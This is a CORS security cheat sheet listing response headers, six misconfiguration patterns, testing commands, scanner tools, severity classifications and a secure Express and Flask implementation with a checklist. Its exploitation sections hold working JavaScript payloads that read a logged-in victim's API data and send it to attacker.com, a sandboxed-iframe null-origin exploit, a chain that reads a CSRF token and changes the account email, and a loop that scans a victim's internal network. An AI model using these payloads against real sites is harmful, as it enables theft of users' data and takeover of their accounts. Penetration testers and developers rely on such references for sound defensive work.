# CORS Cheat Sheet

## Headers reference

### Request
| Header | Example | Set by |
|--------|---------|--------|
| `Origin` | `Origin: https://attacker.com` | Browser (cannot be spoofed) |
| `Access-Control-Request-Method` | `... DELETE` | Browser (preflight) |
| `Access-Control-Request-Headers` | `... X-Custom` | Browser (preflight) |

### Response
| Header | Example | Vulnerable when |
|--------|---------|-----------------|
| `Access-Control-Allow-Origin` | `https://attacker.com` | Reflects arbitrary origins |
| `Access-Control-Allow-Credentials` | `true` | Combined with reflected origin |
| `Access-Control-Allow-Methods` | `GET, POST, DELETE` | Over-permissive (DELETE, PUT) |
| `Access-Control-Allow-Headers` | `*` | Wildcard allows any header |
| `Access-Control-Expose-Headers` | `X-API-Key` | Exposes sensitive headers |
| `Access-Control-Max-Age` | `86400` | Long cache slows remediation |
| `Vary` | `Origin` | Missing → cache poisoning risk |

## Vulnerability patterns

### 1. Arbitrary origin reflection
```javascript
// Vulnerable Node.js
res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
res.setHeader('Access-Control-Allow-Credentials', 'true');
```
Exploit: `fetch('https://victim.com/api/data',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.com/log?data='+btoa(d)))`.

### 2. Null origin trusted
```python
if origin == 'null':
    response.headers['Access-Control-Allow-Origin'] = 'null'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
```
Exploit:
```html
<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="<script>
fetch('https://victim.com/api/data',{credentials:'include'})
.then(r=>r.text())
.then(d=>top.location='https://attacker.com/log?data='+encodeURIComponent(d));
</script>"></iframe>
```

### 3. Regex bypass (missing anchors)
```php
if (preg_match('/victim\.com/', $origin)) { /* vulnerable */ }
```
Bypasses: `https://victim.com.attacker.com`, `https://attackervictim.com`, `https://victimXcom.attacker.com`.

Secure: `^https://[\w-]+\.victim\.com$` (anchors, escaped dot, https only).

### 4. Protocol confusion
Pattern allows `http://*.victim.com`. Chain XSS on a HTTP subdomain → CORS request to HTTPS main domain.

### 5. Wildcard with alternative auth
`Access-Control-Allow-Origin: *` plus auth via header / URL param (not cookies). Steal API key from URL or extract from page, then `fetch` with the stolen key.

### 6. Internal network trust
`if (origin.match(/^https?:\/\/(192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.)/))`. Victim's browser scans/exploits internal services from inside the firewall.

## Exploitation payloads

```javascript
// Basic credential-bearing fetch
fetch('https://victim.com/api/data', { credentials:'include' })
  .then(r=>r.text()).then(d=>navigator.sendBeacon('https://attacker.com/log', d));

// POST action
fetch('https://victim.com/api/action', {
  method:'POST', credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({action:'malicious'})
}).then(r=>r.text()).then(d=>fetch('https://attacker.com/log?r='+btoa(d)));

// Multi-step (CSRF token + action)
fetch('https://victim.com/account',{credentials:'include'})
  .then(r=>r.text())
  .then(html=>{
    const t = html.match(/name="csrf" value="([^"]+)"/)[1];
    const f = new FormData(); f.append('csrf', t); f.append('email','a@evil.com');
    return fetch('https://victim.com/account/change-email',{method:'POST',credentials:'include',body:f});
  });

// Internal network scan
for (let i=1;i<=254;i++) {
  const ip=`192.168.0.${i}`;
  fetch(`http://${ip}:8080/`, {mode:'no-cors', signal:AbortSignal.timeout(1000)})
    .then(()=>console.log('Found:',ip)).catch(()=>{});
}
```

## Testing commands

```bash
# Arbitrary origin
curl -H "Origin: https://evil.com" -H "Cookie: session=abc" -i https://victim.com/api/data
# Null origin
curl -H "Origin: null"             -H "Cookie: session=abc" -i https://victim.com/api/data
# Protocol downgrade
curl -H "Origin: http://victim.com" -H "Cookie: session=abc" -i https://victim.com/api/data
# Subdomain prefix
curl -H "Origin: https://evil.victim.com" -H "Cookie: session=abc" -i https://victim.com/api/data
# Preflight
curl -X OPTIONS -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: DELETE" \
     -H "Access-Control-Request-Headers: X-Custom-Header" -i https://victim.com/api/data
```

Burp Intruder origin payload list: `null`, `https://victim.com`, `http://victim.com`, `https://evil.com`, `https://victim.com.evil.com`, `https://evil-victim.com`, `https://subdomain.victim.com`, `https://victi.com`, `https://victimXcom`, `file://victim.com`.

## Tools

- **Burp BApp**: `CORS*` (additional checks), `Trusted Domain CORS Scanner`
- **Corsy** (`github.com/s0md3v/Corsy`) — `python3 corsy.py -u https://victim.com -c "session=abc"`
- **CORScanner** (`github.com/chenjj/CORScanner`) — `python3 cors_scan.py -u https://victim.com -d -t 20`
- **CorsOne** — `pip install corsone; corsone -u https://victim.com -H "Cookie: session=abc"`
- **of-cors** — internal network exploitation when `ACAO: *` set without credential requirement
- **CorsMe** (`github.com/Shivangx01b/CorsMe`)

### Preflight cache poisoning
If `Access-Control-Max-Age` is set and responses vary by Origin without `Vary: Origin`, poison OPTIONS preflight cache. Test:
```bash
curl -H "Origin: https://evil.com" -I https://victim.com/api/endpoint | grep -i vary
# Vulnerable when no Vary: Origin
```

## Classification

- CVSS v3.1: 8.1 – 9.3 (HIGH–CRITICAL). Vector `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`.
- CWE: 942 (Overly Permissive), 346 (Origin Validation), 639 (Authz Bypass), 284 (Improper Access Control).
- OWASP Top 10: A05 (Misconfig), A01 (Broken AC indirect), A07 (AuthN indirect).
- MITRE: T1189, T1071, T1539, T1567.

## Attack scenarios

1. **API key theft**: vulnerable `/api/user/profile` → CORS reflection → victim visits attacker page while logged in → key stolen.
2. **Banking transaction**: `/api/transfer` with CORS → CSRF token read via CORS → forged transfer.
3. **Admin panel access**: `http://admin.internal:8080` trusts internal origins → external page scans network from victim browser → admin actions.
4. **OAuth token theft**: token endpoint with CORS misconfig → cross-service compromise.

## Secure implementation (Express)

```javascript
const allowed = ['https://trusted-domain.com', 'https://app.trusted-domain.com'];
app.use((req,res,next)=>{
  const origin=req.headers.origin;
  if (allowed.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials','true');
    res.setHeader('Access-Control-Allow-Methods','GET, POST');
    res.setHeader('Access-Control-Allow-Headers','Content-Type, Authorization');
    res.setHeader('Access-Control-Max-Age','600');
    res.setHeader('Vary','Origin');
  }
  if (req.method==='OPTIONS') return res.sendStatus(204);
  next();
});
```

For Flask use `flask_cors.CORS(app, origins=allowed, supports_credentials=True, methods=['GET','POST'], allow_headers=['Content-Type','Authorization'], max_age=600)`. For PHP/Java/Spring follow same pattern: explicit allowlist, anchored regex if pattern matching, never `*` with credentials, always `Vary: Origin`.

## Security checklist

- No wildcard with credentials
- Explicit allowlist (no reflection)
- Regex anchored (`^...$`), escaped dots, https only
- Never trust `null` in production
- `Vary: Origin` set
- Minimal methods
- Short `Max-Age` (≤ 3600s) on sensitive endpoints
- Subdomain trust carefully scoped
- Internal-network origins not blindly trusted

## Resources

- [PortSwigger CORS](https://portswigger.net/web-security/cors)
- [MDN CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [RFC 6454 Web Origin Concept](https://tools.ietf.org/html/rfc6454)
- [HackerOne disclosed CORS reports](https://hackerone.com/hacktivity?querystring=cors)
